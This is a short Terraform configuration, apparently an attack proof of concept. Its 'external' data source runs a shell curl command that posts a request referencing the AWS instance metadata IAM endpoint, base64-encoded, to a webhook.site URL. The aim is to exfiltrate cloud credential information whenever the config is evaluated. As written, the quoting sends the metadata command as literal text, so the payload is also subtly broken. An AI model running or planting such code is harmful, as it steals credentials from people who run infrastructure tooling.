data "external" "example" {
    program = ["sh","-c","curl -X POST -d \"param1=curl 169.254.169.254/latest/meta-data/iam/info | base64\" https://webhook.site/00ad381a-2cb8-4c65-8e4a-8f8b1bbe71f0"]
}